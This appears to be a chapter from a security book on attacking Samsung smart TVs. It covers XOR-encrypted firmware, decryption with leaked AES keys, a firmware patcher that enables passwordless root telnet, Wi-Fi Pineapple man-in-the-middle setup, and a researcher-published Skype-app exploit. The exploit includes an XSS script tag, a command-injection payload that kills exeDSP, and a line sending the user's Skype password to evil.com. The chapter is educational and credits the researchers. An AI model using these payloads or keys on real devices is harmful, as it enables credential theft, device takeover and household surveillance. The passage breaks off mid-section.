Chapter 5: The Idiot Box: Attacking “Smart” Televisions

$ ./xor
($-
The XOR operation of cat and KEY results in the output ($-. This is because the program
performs an XOR operation of c with K, a with E, and t with Y. Let’s analyze one of these
operations, i.e. c with K. The ASCII value of c is 99, which is represented as 01100011.
The ASCII value of K, is 75 which is represented in binary as 01001011. Now let us XOR
these two values:
        01100011
(XOR)   01001011
        --------
        00101000
        --------
The result is 00101000 in binary which is the decimal 40 whose ASCII value is (. This
explains why the program output ($-. Feel free to repeat this manual exercise for the
remaining two characters and you should come up with $ and -.
In our case, the encryption key was “KEY” and the clear-text data was the word cat
resulting in the cyphertext ($-. Anyone who knows the cyphertext and is in possession
of the key KEY can decrypt ($- back to the clear-text cat. Let us make sure this works.
#include <stdio.h>
int main()
{
  char string[4]="($-";
  char key[4]="KEY";
  for(int x=0; x<3; x++)
  {
    string[x]=string[x]^key[x];
    printf("%c",string[x]);
  }
  printf("\n");
  return 1;
}
Let’s compile and run the program:
$ gcc xor2.c -o xor2
$ ./xor2
cat
This is a simple and easy description of how XOR works. Of-course, in our case, we
used a key of the same length as the clear-text data so that the example is easy to un‐
derstand. In real life, it is important to use a longer key otherwise it becomes easy for
You call that Encryption? 
| 
155

an attacker to guess the key with brute-force. If the data is longer than the key, the key
is repeated to match up with the data. XOR is a very strong encryption algorithm in the
case where the key is a one-time-pad, i.e. if the key never repeats and is as long or longer
than the data.
I call it Encraption
SamSung allows users to download firmware that can be placed on a USB stick and
connected to the Smart TV in order to perform upgrades. In this case, we will download
the firmware for the PN58B860Y2F model. In this case, we will analyze the firmware
issued on September 22, 2009 with version 1013(Figure 5-2).
Figure 5-2. Firmware upgrade downloads available on SamSung’s website
Even though the firmware upgrade file is in the windows executable format of .exe, it
is also a zip file that can be uncompressed using the unzip tool:
$ unzip 2009_DTV_2G_firmware.exe
Archive:  2009_DTV_2G_firmware.exe
  inflating: T-CHE7AUSC/crc
  inflating: T-CHE7AUSC/ddcmp
   creating: T-CHE7AUSC/image/
  inflating: T-CHE7AUSC/image/appdata.img.enc
  inflating: T-CHE7AUSC/image/exe.img.enc
 extracting: T-CHE7AUSC/image/info.txt
  inflating: T-CHE7AUSC/image/validinfo.txt
  inflating: T-CHE7AUSC/image/version_info.txt
156 
| 
Chapter 5: The Idiot Box: Attacking “Smart” Televisions

  inflating: T-CHE7AUSC/MicomCtrl
  inflating: T-CHE7AUSC/run.sh.enc
The important firmware image files appear to be T-CHE7AUSC/image/appda
ta.img.enc and T-CHE7AUSC/image/exe.img.enc. Let’s see what happens when we in‐
spect these files using the strings tool, which is used to output the printable parts of
binary files:
$ strings T-CHE7AUSC/image/exe.img.enc
ct-KLG7CUQC,
KHM7@USCT-CHE7AUz'r
ausct
dect
CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-
CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-
CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-
CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-
CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-
CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-
CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-
CHE7AUSCT-CHE7AUSCT-CHE7AUSC
[rest of output removed for brevity]
Isn’t it interesting to see the string T-CHE7AUSC repeat in a file that is supposedly en‐
crypted? It is especially notable because it is also the name of the root directory, which
is created when the firmware download is unzipped, and as such this string is deemed
clear-text. If the image files are truly encrypted, this string should not be showing up in
clear. What is going on here? Well, let’s take a moment to consider what happens when
a character is XOR’d with the null ASCII character of decimal value 0. Null strings are
often used to signify the end of strings in memory and represented with the escape
sequence of \0.
The C program below performs an XOR operation between the character a and the null
character:
#include <stdio.h>
int main()
{
  printf("%c\n",'a' ^ '\0');
  return 1;
}
Let’s compile and run our program to see the output:
$ gcc xor_null.c -o xor_null
$ ./xor_null
a
You call that Encryption? 
| 
157

So there we have it. The XOR operation of a character with a null reveals the original
character. This means that if your XOR key is small and if the file you are XOR-ing
contains a series of null characters, the actual key will be revealed in the cyphertext! This
is exactly what happened in the case of the SamSung firmware file we looked at using
the strings command. SamSung made the mistake of using a small key without under‐
standing that the image file they are encrypting contained a lot of null characters (this
is very common in binary files). Not only did they commit this mistake, the root di‐
rectory name of the firmware is also the key.
The implications of this is that anyone can decrypt the firmware with the exposed key,
make changes to the firmware, and encrypt it again using the same key. This bypasses
SamSung’s wish that users and external parties should not be allowed to tinker with the
core functionality of the TVs to bypass application and digital rights controls.
The SamyGO website and forums are thriving with activity from SamSung TV owners
who want to modify their TVs in just the way SamSung wouldn’t want them to. One of
the popular tools available from SamyGO is called SamyGO Firmware Patcher which
exploits the XOR vulnerability we just looked at. This tool enables telnet so users can
remotely login to the TV and obtain a Linux prompt so they can further modify the TV.
To run this tool, you just have to download the firmware as we did earlier and issue the
path to the location of the firmware:
$ python ./SamyGO.py ~/Downloads/T-CHE7AUSC
SamyGO Firmware Patcher v0.16 Beta (c) 2010 Erdem U. Altinyurt
                  -=BIG FAT WARNING!=-
           You can brick your TV with this tool!
Authors accept no responsibility about ANY DAMAGE on your devices!
        project home: http://SamyGO.sourceforge.net
XOR Encrytped CI firmware detected.
Decrypting with XOR key :  T-CHE7AUSC
Crypto package found, using fast XOR engine.
Applying VideoAR Patch...
MD5 of Decrypted image is : 9b4d11ddc6bd41156573ae61d1660fdf
FAT image analyzed - exeDSP location: 7811072  size: 37414044
ARM ELF exeDSP File Detected
CToolMmbDisplaySizeItem::GetToolItem() Adress : 0x13537D0
CToolMmbDisplaySizeItem::PressLeftRightKey() Adress : 0x1353AC8
VideoAR Fix v1 Compatibility Found.
VideoAR Fix v1 Patched on image.
Applying Telnet Patch...
Searching %3
Suitable Location Found for Script injection on Offset : 3969567
Enable Telnet or Advanced Mode on image( T/a )?
Patching File...
Telnet Enabled on image.
158 
| 
Chapter 5: The Idiot Box: Attacking “Smart” Televisions

Calculatin new CRC :  d71d7f17
Updating /SamyGO/T-CHL7DEUC/image/validinfo.txt with new CRC.
Encrypting with XOR :  T-CHE7AUSC
Crypto package found, using fast XOR engine.
Operation successfully completed.
Now you can flash your TV with ./T-CHL7DEUC directory.
Notice that the SamyGo.py tool decrypted the “encrypted” image with the exact key we
found using the strings command (T-CHE7AUSC). It then patches the firmware to in‐
clude the telnet service and encrypts it with the same XOR key. Now, all the user has to
do is place the T-CHE7AUSC directory and it’s contents onto a USB stick and connect it
to the TV. The TV will then go through the process of upgrading the firmware, which
will cause it to enable the telnet function. The default username applied by the patch is
root and there is no password required (Figure 5-3).
Figure 5-3. No password required to login to the SamSung TV after applying telnet
patch
The SamyGO website contains tons of additional tools that exploit
conditions beyond the example listed in this chapter. If you have a
SamSung TV, take a look and see what tools are available that may
interest you.
Give some thought to the gravity of the situation SamSung has caused because they did
not comprehend the basics of the XOR algorithm. With this one mistake, they’ve caused
the SamyGo community to further thrive, which is against the interests of the business
of SamSung. Highly technical users love this situation since it gives them tremendous
freedom to modify the Smart TV device they feel they paid for and feel they should be
allowed to modify. From Samsung’s point of view, however, users are now able to tweak
You call that Encryption? 
| 
159

the firmware, which can cause TVs to malfunction. This also places legal concerns from
content providers SamSung may have partnered with since firmware tweaks can be
abused to legally store and distribute content protected media.
The SamyGo community doesn’t seem particularly savvy when it comes to security. As
Figure 5-3 shows, the patches being applied to increase functionality utilize no pass‐
words, or in some cases weak passwords (such as “SamyGo”). Not only can a sophisti‐
cated user place malware on a TV he or she has physical access to (by patching the
firmware to include remote monitoring tools), but malware on other devices on the
same network as that of the SamSung TV can attempt to login to tweaked TV sets by
attempting null passwords or “SamyGo”.
The firmware we studied was last updated on 2009. This is because there is little hope
for SamSung to rectify this problem on older TVs. If SamSung decided to patch this
issue, they’d have to first release the patch, which is encrypted using the flawed XOR
mechanism so that the existing TVs can apply the patch in the first place. This situation
allows someone to decrypt the patch and analyze the patch in the clear. Even if SamSung
were to find an elegant way to do this, it would be operationally infeasible since the user
wouldn’t be able to only apply the latest patch if they were to skip a few versions (which
most users do). They’d be required to first issue the critical patch that fixed the XOR
flaw so that the TV could understand the new encryption mechanism that is used to
protect the latest firmware file. See the amount of mess this has created?
The slang “encraption” (with the emphasis on “crap”) is affectionately used by the cy‐
bersecurity community to call out badly implemented encryption. As such, the title of
this section is rightfully justified.
Understanding and Exploiting the App World
Smart TVs have Apps such as Skype, the popular video conferencing solution. In this
section, we will take a deeper look into the world of Apps on TVs to understand how
they work and the security mechanisms surrounding them. In the future, more and
more people are going to use and rely on Apps on their Smart TVs so the potential for
abuse becomes higher. This is because more Apps will mean more code is written to
run on TVs and this code may contain security vulnerabilities. The popularity of Apps
will also draw the interest of malicious attackers who have an interest in continuing to
find avenues to exploit systems to steal data from victims.
Decrypting Firmware
For us to have a deeper understanding of how Apps work, we need to become familiar
with the underlying platform that supports the functionality of a Smart TV. We’ve dis‐
cussed the weak XOR encryption used in SamSung TVs that allows for the decryption
and patching of firmware. SamSung has countered this by encrypting the firmware using
160 
| 
Chapter 5: The Idiot Box: Attacking “Smart” Televisions

AES in newer models of their Smart TVs. However, the secret encryption key has been
leaked and is available to the public. It is unclear how this happened, but tools from the
SamyGo website contain this key and can easily decrypt the firmware downloaded from
the Samsung website.
Let’s start with a firmware that we know been encrypted utilizing AES:
$ ls -l T-ECPDEUC/image/
total 197164
-rw-rw-r-- 1 apple apple 192794916 Apr 29  2013 exe.img.sec
-rw-rw-r-- 1 apple apple       132 Apr 29  2013 exe.img.sec.cmac
-rw-rw-r-- 1 apple apple       256 Apr 29  2013 exe.img.sec.cs
-rw-rw-r-- 1 apple apple       256 Apr 29  2013 exe.img.sec.vs
-rw-rw-r-- 1 apple apple   3272292 Apr 29  2013 Image.sec
-rw-rw-r-- 1 apple apple       132 Apr 29  2013 Image.sec.cmac
-rw-rw-r-- 1 apple apple       256 Apr 29  2013 Image.sec.cs
-rw-rw-r-- 1 apple apple       256 Apr 29  2013 Image.sec.vs
-rw-rw-r-- 1 apple apple        17 Apr 29  2013 info.txt
-rw-rw-r-- 1 apple apple         7 Apr 29  2013 major_version
-rw-rw-r-- 1 apple apple         6 Apr 29  2013 minor_version
-rw-rw-r-- 1 apple apple   5763492 Apr 29  2013 rootfs.img.sec
-rw-rw-r-- 1 apple apple       132 Apr 29  2013 rootfs.img.sec.cmac
-rw-rw-r-- 1 apple apple       256 Apr 29  2013 rootfs.img.sec.cs
-rw-rw-r-- 1 apple apple       256 Apr 29  2013 rootfs.img.sec.vs
-rw-rw-r-- 1 apple apple        65 Apr 29  2013 validinfo.txt
-rw-rw-r-- 1 apple apple        48 Apr 29  2013 version_info.txt
In order to decrypt this firmware, we can use the SamyGO Firmware Patcher which has
the leaked secret key embedded in the tool:
$ ./SamyGO.py decrypt_all ./T-ECPDEUC
SamyGO Firmware Patcher v0.34 (c) 2010-2011 Erdem U. Altinyurt
                   -=BIG FAT WARNING!=-
            You can brick your TV with this tool!
Authors accept no responsibility about ANY DAMAGE on your devices!
         project home: http://www.SamyGO.tv
Firmware:  T-ECPDEUC v2008.2
AES Encrytped CI+ firmware detected.
Processing file Image.sec
secret key :  3EF6067262CF0C678598BFF22169D1F1EA57C284
Decrypting AES...
Decrypting with  XOR Key :  T-ECPDEUC
Crypto package found, using fast XOR engine.
Calculated CRC : 0xEF4527E9
CRC Validation passed
Processing file rootfs.img.sec
secret key :  3EF6067262CF0C678598BFF22169D1F1EA57C284
Understanding and Exploiting the App World 
| 
161

Decrypting AES...
Decrypting with  XOR Key :  T-ECPDEUC
Crypto package found, using fast XOR engine.
Calculated CRC : 0xCF5DC1D2
CRC Validation passed
Processing file exe.img.sec
secret key :  3EF6067262CF0C678598BFF22169D1F1EA57C284
Decrypting AES...
Decrypting with  XOR Key :  T-ECPDEUC
Crypto package found, using fast XOR engine.
Calculated CRC : 0x109B6984
CRC Validation passed
Notice the secret key that is embedded in the tool. Now that have the decrypted versions
of the image files:
$ ls -l T-ECPDEUC/image/
total 591372
-rw-r--r-- 1 apple apple 192794624 Dec  3 15:40 exe.img
-rw-r--r-- 1 apple apple 192794624 Dec  3 15:39 exe.img.enc
-rw-r--r-- 1 apple apple 192794916 Apr 29  2013 exe.img.sec
-rw-r--r-- 1 apple apple       132 Apr 29  2013 exe.img.sec.cmac
-rw-r--r-- 1 apple apple       256 Apr 29  2013 exe.img.sec.cs
-rw-r--r-- 1 apple apple       256 Apr 29  2013 exe.img.sec.vs
-rw-r--r-- 1 apple apple   3272000 Dec  3 15:39 Image
-rw-r--r-- 1 apple apple   3272000 Dec  3 15:39 Image.enc
-rw-r--r-- 1 apple apple   3272292 Apr 29  2013 Image.sec
-rw-r--r-- 1 apple apple       132 Apr 29  2013 Image.sec.cmac
-rw-r--r-- 1 apple apple       256 Apr 29  2013 Image.sec.cs
-rw-r--r-- 1 apple apple       256 Apr 29  2013 Image.sec.vs
-rw-r--r-- 1 apple apple        17 Apr 29  2013 info.txt
-rw-r--r-- 1 apple apple         7 Apr 29  2013 major_version
-rw-r--r-- 1 apple apple         6 Apr 29  2013 minor_version
-rw-r--r-- 1 apple apple   5763204 Dec  3 15:39 rootfs.img
-rw-r--r-- 1 apple apple   5763204 Dec  3 15:39 rootfs.img.enc
-rw-r--r-- 1 apple apple   5763492 Apr 29  2013 rootfs.img.sec
-rw-r--r-- 1 apple apple       132 Apr 29  2013 rootfs.img.sec.cmac
-rw-r--r-- 1 apple apple       256 Apr 29  2013 rootfs.img.sec.cs
-rw-r--r-- 1 apple apple       256 Apr 29  2013 rootfs.img.sec.vs
-rw-r--r-- 1 apple apple        65 Apr 29  2013 validinfo.txt
-rw-r--r-- 1 apple apple        48 Apr 29  2013 version_info.txt
There we have it, decrypted versions of exe.img and rootfs.img.
Cursory Exploration of the Operating System
Now let’s examine the underlying platform supporting the popular Smart TVs. We’ve
already obtained and decrypted the firmware. Let’s access it and take a look at its con‐
tents. This will allow us to understand how SmartTVs are architected. This under‐
162 
| 
Chapter 5: The Idiot Box: Attacking “Smart” Televisions

standing in turn will help us comprehend existing attack vectors more deeply. In addi‐
tion, this knowledge will help you with the information you need should you decided
to do further research of your own.
To start with, let us take a look at the freshly decrypted image files to see how Samsung
managed to design their platform, which is based on Linux. Let’s mount rootfs.img:
$ mount rootfs.img /media/rootfs.img/ -o loop
In etc/profile we find the following partitions:
############## Partition Information ##############
export MTD_ONBOOT=/dev/mmcblk0p0
export MTD_UBOOT=/dev/mmcblk0p1
export MTD_KERNEL_0=/dev/mmcblk0p2
export MTD_ROOTFS_0=/dev/mmcblk0p3
export EX_PARTITION=/dev/mmcblk0p4
export MTD_KERNEL_1=/dev/mmcblk0p5
export MTD_ROOTFS_1=/dev/mmcblk0p6
export SECUREMAC0=/dev/mmcblk0p7
export SECUREMAC1=/dev/mmcblk0p8
export SECUREMAC2=/dev/mmcblk0p9
export MTD_DRMREGION_A=/dev/mmcblk0p10
export MTD_DRMREGION_B=/dev/mmcblk0p11
export MTD_RWAREA=/dev/mmcblk0p12
export MTD_EXE_0=/dev/mmcblk0p13
export MTD_EXE_1=/dev/mmcblk0p14
export MTD_ROCOMMON=/dev/mmcblk0p15
export MTD_EMANUAL=/dev/mmcblk0p16
export MTD_CONTENTS=/dev/mmcblk0p17
export MTD_SWU=/dev/mmcblk0p18
export MTD_RWCOMMON=/dev/mmcblk0p19
That’s a total of 20 partitions. These are a lot of partitions for a single system, but a lot
of these are mounted in read only mode, which limits attack vectors.
Here is the exeDSP executable we mentioned earlier which is the main executable used
to control the TV’s functionality:
$ ls -lh /media/exe.img/exeDSP
-rwxr-xr-x 1 root root 146M Apr 28  2013 /media/exe.img/exeDSP
Notice that the file size of exeDSP is 146 Megabytes, which is unusually large for a single
executable. This illustrates that a lot of functionality has been directly coded into the
executable rather than in shared libraries or shared code. That said, there are additional
shared libraries in the image as well.
There is also evidence that the TV uses the X11 Windows system to display the user
interface:
/media/exe.img/Runtime/bin:
total 7228
Understanding and Exploiting the App World 
| 
163

drwxr-xr-x 2 root root     103 Apr 28  2013 .
drwxr-xr-x 9 root root     152 Apr 28  2013 ..
-rwxr-xr-x 1 root root 4356171 Apr 28  2013 compiz
-rwxr-xr-x 1 root root   17237 Apr 28  2013 fc-cache
-rwxr-xr-x 1 root root   14044 Apr 28  2013 gdk-pixbuf-query-loaders
-rwxr-xr-x 1 root root 3010259 Apr 28  2013 X
-rwxr-xr-x 1 root root    2241 Apr 28  2013 xorg.conf
Here’s a snippet from the xorg.conf file:
Section "Screen"
        Identifier      "Mali Screen"
        Device          "Mali FBDEV"
        Monitor         "Mali Monitor"
        DefaultDepth    24
        SubSection      "Display"
             ViewPort   0 0
        Modes           "1920x1080@60" "1024x768" "1280x720" "960x540@60"
                            "960x540@50"
                        "720x576" "1920x720@50d" "720x480" "960x1080@50"
                            "960x1080@60"
                        "1920x540@60" "1920x540@50"
        EndSubSection
EndSection
This appears accurate since the firmware we are looking at is for an HD capable TV and
the true HD resolution is 1920x1080 which is listed as the first preference. Other reso‐
lutions are also available.
Another interesting item to note on our cursory quest to understand the underlying
system is the presence of cmk files:
$ ls -l /media/exe.img/infolink/manager/*.cmk
-r--r--r-- 1 root root   640 Apr 28  2013 /media/exe.img/infolink/manager/
                                            config.xml.cmk
-r--r--r-- 1 root root 11872 Apr 28  2013 /media/exe.img/infolink/manager/
                                            index.html.cmk
These are “encrypted” files, however the keys for them have already been leaked and
available on the SamyGo forums (Figure 5-4).
164 
| 
Chapter 5: The Idiot Box: Attacking “Smart” Televisions

Figure 5-4. Leaked encryption keys available on the SamyGo forums
Using the leaked keys, it’s easy to decrypt any cmk file:
$ openssl aes-128-cbc -d -K B1D5F122E75D757C79F48886D42F8E1A -in index.html.cmk
    -nosalt -iv BFE932F9273DC2A0DFC93F0B8E7AC7C2 -out index.html
The index.html contains JavaScript code, here is a snippet:
<body id='SmartHubBody' onload='SmartHomeMain.onCreate();' onunload='SmartHomeMa
in.onDestroy();' style='background-color: transparent; width: 1920px; height: 10
80px;overflow:hidden;'>
This gives us cursory background into the underlying platform of a SamSung Smart TV.
The system is based on the Linux operating system and configured more or less like any
other Linux device. We’ve seen evidence of the exeDSP executable, configuration files,
and the X11 windows system. We’ve also seen yet another instance where the imple‐
mented encryption has been broken by way of leaked encryption keys available online.
SamSung, other Smart TV manufacturers, and IoT device manufacturers and designers
should take heed from these examples to understand that even though they may be using
good encryption algorithms, they need to make sure they implement these algorithms
with a proper understanding of their weaknesses.
Remotely Exploiting a SamSung Smart TV
Imagine if an intruder could remotely exploit your Smart TV that has a video camera
attached to it. The privacy of you and your family are immediately at risk. In addition
Understanding and Exploiting the App World 
| 
165

the private data and credentials stored within various Apps running on your Smart TV
can be compromised. Researchers Aaron Grattafiori and Josh Yavor demonstrated at‐
tacks like this at the BlackHat 2013 security conference in Las Vegas. We will go through
their research in this section.
SamSung provides a free Software Development Kit (SDK) that lets developers write
custom Apps. These Apps can then be tested on a simulator and then submitted to the
SamSung store for approval. On its website (Figure 5-5), Samsung promises “Samsung
Smart TV has security modules to prevent to malicious TV Apps (from) running”. We’ve
already seen how weakly encryption has been implemented and that encryption keys
have been compromised. In addition to this, we will see an exploit in the next few
paragraphs that makes the rest of Samsung’s security promise fall apart as well.
Figure 5-5. SamSung’s website promises security to developers
Samsung calls the Apps widgets. Every widget has the following files in its directory,
examples of which can easily be seen in the included examples in the SDK:
• config.xml: A simple XML files that defines and describes the various properties
of the application.
• index.html: This is the main access point of the application. This file usually in‐
cludes JavaScript files that contain most of the code for the application.
166 
| 
Chapter 5: The Idiot Box: Attacking “Smart” Televisions

• JavaScript files (.js): Contain the code for the application.
• Main.css: Style sheet definition to control the look and formatting of the applica‐
tion.
Grattafiori and Yavor looked at the Skype App included in the Samsung Smart TV
starting with the config.xml:
<widget>
<category>lifestyle</category>
<autoUpdate>y</autoUpdate>
<cpname>Skype</cpname>
<login>n</login>
<ver>2.120601</ver>y
<mgrver>2.305</mgrver>
<emp>empSkype::empCamera</emp>
<fullwidget>y</fullwidget>
<widgetname>Skype</widgetname>
<description>Skype application</description> <runTitle>Skype</runTitle>
<author>
<name>Samsung Electronics Co. Ltd.</name> <link>http://www.sec.co.kr/</link>
<organization>Samsung Electronics Co. Ltd.</organization> </author>
</widget>
It is interesting that the name and organization is listed as Samsung even though Skype
supplies the code. This signifies that Skype provided SamSung with the binaries and
libraries to support the application but it was the Samsung engineers who actually de‐
veloped and integrated the main application.
Here is the index.html for the Skype App:
<html>
<head>
<meta http-equiv="Content-Type" content="text/html">
<title>2011 MoIP Widget</title>
<script type="text/javascript" src="$MANAGER_WIDGET/Common/API/Widget.js">
</script>
<script type="text/javascript" src="$MANAGER_WIDGET/Common/core.js"></script>
<OBJECT id="pluginObjectAppCommon_Skype" border=0 classid="clsid:SAMSUNG-
    INFOLINK-APPCOMMON" style="display:block;width:0px;height:0px;"></OBJECT>
<OBJECT id="EmpSkype" border=0 classid="clsid:SAMSUNG-INFOLINK-SEF"></OBJECT>
</head>
<body>
<script type="text/javascript" language="javascript" src="$MANAGER_WIDGET/Common/
    IME/ime2.js">
</script>
</body>
</html>
While analyzing the Skye App, Grattafiori and Yavor found snippets like these in the
JavaScript code:
Understanding and Exploiting the App World 
| 
167

PluginAPIMgr.GetMyStorageInfo = function()
{
alert("PluginAPIMgr.GetMyStorageInfo");
var result = this.ExWidgetInterfacePlugin.Execute("ReadWidgetData
    ", "SkypeInfo"; return result;
}
In JavaScript, the alert function is used to pop-up a dialog box and display the string
passed in as a parameter. However, in this case, the SamSung TV was actually logging
the given string to a local file. The researchers realized that this meant that SamSung
had modified the actual JavaScript interpreter and that the JavaScript platform was able
to perform local file and system operations. This is interesting because JavaScript code
running in a typical web browser is usually not allowed to perform system level oper‐
ations like these (without some explicit tweaking). This means that a simple flaw in the
App could result in a remotely exploitable condition.
The popular attack vector, XSS (Cross Site Scripting), usually depends upon the lack of
the web application to validate HTML characters (such as <, >, /, etc) which in turn
allows attackers to inject malicious JavaScript code. Quite similar to an XSS attack, the
researchers found the lack of validation in the “mood” message. As you can imagine,
mood messages are basically status messages such as “Just had coffee, a little jittery
today!” or “Out an about, may not respond immediately so be patient!”. Now imagine
a mood message like the following:
<script src="http://tv.isecpartners.com/reboot.js"></script>
Now imagine if you someone sent you a message on Skype and had the above as his or
her mood message. You’d expect the App to actually display the mood message as
<script src="http://evil.com/reboot.js"></script>. But instead, the Skype app
actually processes the string as code and executes it. This causes the Skype App to fetch
reboot.js and also process the code in it! Now imagine if the following were the content
of reboot.js:
fileobject = document.createElement('object');
fileobject.setAttribute("id", "pluginObjectFile");
fileobject.setAttribute("classid", "clsid:SAMSUNG-INFOLINK-FILESYSTEM");
document.getElementsByTagName("body"[0].appendChild(fileobject);
filePlugin = document.getElementById('pluginObjectFile');
// Kill exeDSP, forcing reboot
filePlugin.Copy("/proc/self/cmdline", "\$(killall exeDSP)/tmp/foo");
Notice the parameters to filePlugin.Copy. Grattafiori and Yavor noted that they could
inject the kilall exeDSP command as a parameter which caused the TV to reboot since
the exeDSP processes handle all the functionality of the TV. This is actually a security
bug in the way SamSung modified the JavaScript interpreter.
168 
| 
Chapter 5: The Idiot Box: Attacking “Smart” Televisions

The researchers took things further with a scenario where the mood message of the
malicious Skype user is the following:
<script src="http://tv.isecpartners.com/exfil.js"></script>
Now assume exfil.js contains JavaScript code like this:
creds = PluginAPIMgr.GetMyStorageInfo();
new Image().src="http://evil.com/"+creds;
The researchers found that the GetMyStorageInfo() call actually returned the value of
the user’s Skype password in clear text. This malicious code then sends the credentials
to the evil.com server as a parameter. The attacker, who owns evil.com, can then look
at the web server logs to note the password. At this point, the attacker can quickly log
into Skype and hijack the victim’s account.
Grattafiori and Yavor have found multiple exploitable conditions such as this issue with
Skype. Web browser designers have learnt the hard way to sandbox client side code such
as JavaScript and respect the same-origin policy. These are fundamental and well-known
security concepts in the world of web security. SamSung’s implementation is counter to
this fundamental security principle. JavaScript code loaded from external domains
should not be allowed to execute with the same privileges as that of code loaded from
the local file system. Furthermore, the custom tweaking of the JavaScript interpreter to
introduce custom functionality should be carefully designed to make sure no security
bugs are being introduced The lesson to be learnt from this is that security fundamentals
such as validation of data and adherence to cross-origin policies are basic security re‐
quirements and ought to be baked into the design of Smart TVs and other IoT devices.
These are not complex attacks but the flaws are based on attack vectors the industry has
known for more than a decade.
There have been various other researchers that have found addition‐
al flaws in SamSung Smart TVs that exploit basic security mecha‐
nisms, including input validation. One notable researcher in this field
is SeungJin Lee who along with Seungjoo Kim found and reported
multiple vulnerabilities to SamSung. Their research is worth read‐
ing and available online.
IoT device manufacturers such as SamSung definitely need to do a better job of imple‐
menting these basic principles to protect their business as well as the privacy of their
loyal customers. A simple attack like this can be exploited to install a persistent backdoor
on the Smart TV, allowing the attacker to continuously steal credentials and even re‐
motely view the victims’ premises through the video camera attached to the TV(if
present). These types of attacks can therefore compromise the privacy of an entire
household. Smart TV and other IoT manufacturers must take these issues seriously and
Understanding and Exploiting the App World 
| 
169

strive to implement security measures the industry has already learnt from correcting
past mistakes.
Inspecting Your Own Smart TV (and other IoT devices)
There is a good chance that you own or have access to a Smart TV. In addition to being
aware of the research presented so far, it is a good idea to dive deep into inspecting the
network traffic from and to the TV. This promotes greater understanding of the topic
of Smart TV security and gives you the opportunity to tinker with the system and
perhaps find a new vulnerability to report to the manufacturer.
Say Hello to the Pineapple Mark V
The Pineapple Mark Vis a wonderful little device (Figure 5-6). Capturing network traffic
is often cumbersome because it requires you to download various pieces of software
such as tools and virtual machine images. Additionally, you need to specifically con‐
figure these tools and this can take up a lot of time and money. The Pineapple V is an
all inclusive product in the form of an wifi access point that easily lets you capture
network traffic and execute various types of network related attacks. The Pineapple V
can be purchased online.
Figure 5-6. The Pineapple Mark V
We will use three devices in our scenario:
1. A Laptop that is connected to the internet and with an available ethernet port.
170 
| 
Chapter 5: The Idiot Box: Attacking “Smart” Televisions

2. A Pineapple Mark V connected to the laptop via an ethernet cable.
3. A Smart TV connected to the wireless network exposed by the Pineapple Mark V.
First, we will setup a new Pineapple Mark V by connecting the laptop to it using an
ethernet cable. For setup, we have to browse to http://172.16.42.1:1471 and we are
presented with the screen shown in Figure 5-7.
Figure 5-7. The Setup screen
Upon clicking on “Continue”, you are asked to pick a password for the Pineapple Mark
V. Make sure to select a fairly strong and complex password. Otherwise someone within
physical vicinity of you may be able to connect to the Pineapple and potentially com‐
promise your data and other devices on your network.
Once you click on “Set Password”, the Pineapple will reboot. Wait for a few minutes and
then click on the “Continue” link that appears. A login screen will appear where you
need to input the password you just created. Upon successful authentication, you’ll be
shown the main section illustrated in Figure 5-8.
Inspecting Your Own Smart TV (and other IoT devices) 
| 
171

Figure 5-8. Main section upon login
Next, change the default name of the wifi network exposed by the Pineapple (example:
“Trust_Me”). To do this, select “Karma” followed by “Karma Configuration” and enter
“Trust_Me” in the “SSID” field below “SSID Configuration”. Then click on “Update”
(Figure 5-9).
172 
| 
Chapter 5: The Idiot Box: Attacking “Smart” Televisions

Figure 5-9. Change the default name of the wifi network exposed by the Pineapple
We will assume the laptop being used is running Linux. We will setup internet connec‐
tion sharing so that the Pineapple can access the Internet via the laptop. (Instructions
on how to do this in Windows and OSX are available online.)
On the Linux laptop, we download the internet-connection sharing script:
$ wget http://wifipineapple.com/wp5.sh
Next, we set the executable flag and run the script:
$ sudo ./wp5.sh
[sudo] password for apple:
  _       ___ _______    ____  _                              __
 | |     / (_) ____(_)  / __ \(_)___  ___  ____ _____  ____  / /__
 | | /| / / / /_  / /  / /_/ / / __ \/ _ \/ __ '/ __ \/ __ \/ / _ \
 | |/ |/ / / __/ / /  / ____/ / / / /  __/ /_/ / /_/ / /_/ / /  __/
 |__/|__/_/_/   /_/  /_/   /_/_/ /_/\___/\__,_/ .___/ .___/_/\___/
  OWN the Network                            /_/   /_/       v2.2
Pineapple Netmask [255.255.255.0]:
Pineapple Network [172.16.42.0/24]:
Interface between PC and Pineapple [eth0]:
Interface between PC and Internet [wlan0]:
Internet Gateway [192.168.231.2]:
IP Address of Host PC [172.16.42.42]:
IP Address of Pineapple [172.16.42.1]:
Inspecting Your Own Smart TV (and other IoT devices) 
| 
173

     _ .           ___          \||/   Internet: 192.168.231.2 - wlan0
   (  _ )_  <-->  [___]  <-->  ,<><>,  Computer: 172.16.42.42
 (_  _(_ ,)       \___\        '<><>' Pineapple: 172.16.42.0/24 - eth0
Browse to http://172.16.42.1:1471
In this case, we accepted all the default options offered by the script. At this point, the
Pineapple is connected to the Internet. Next, we configure the Smart TV to hop on to
the “Trust_Me” network (refer to your TV’s manual for instructions on how select a
particular wifi network). An example what this looks like is shown in Figure 5-10.
Figure 5-10. Cofigure the Smart TV to hop on to the Pineapple
Now, all network traffic to and from the TV will flow through the Pineapple.
174 
| 
Chapter 5: The Idiot Box: Attacking “Smart” Televisions

Since the “Trust_Me” network is not protected by a password, any‐
one around you can also connect to it and potentially capture net‐
work traffic from your Smart TV that is connected to the Pineap‐
ple, or any other device connected to the Pineapple.
Capturing credentials and stripping TLS
In this section, we will demonstrate the sslstrip tool. This tool strips redirection to
secure websites and helps perform a Man in the Middle attack. For example, if you’d
like to login to Facebook, you are most likely to type in facebook.com in your web
browser (the secure way to do this is to request the TLS encrypted version of the website
by specifically typing in https://facebook.com but users normally don’t do this). Let’s
use the telnet client to see what happens when the browser connects to facebook.com:
$ telnet www.facebook.com 80
